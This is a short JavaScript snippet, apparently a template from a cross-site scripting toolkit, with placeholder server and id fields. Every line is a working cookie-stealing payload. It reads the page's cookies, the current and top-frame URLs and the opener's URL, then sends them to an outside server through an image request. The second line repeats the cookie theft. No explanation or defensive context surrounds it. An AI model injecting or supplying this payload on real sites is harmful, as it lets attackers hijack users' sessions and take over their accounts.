(function(){(new Image()).src='http://{{$server}}/x?id={{$id}}&s={{$source}}&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
if(''==1){keep=new Image();keep.src='http://{{$server}}/x?id={{$id}}&s={{$source}}&location='+escape(document.location)+'&cookie='+escape(document.cookie)};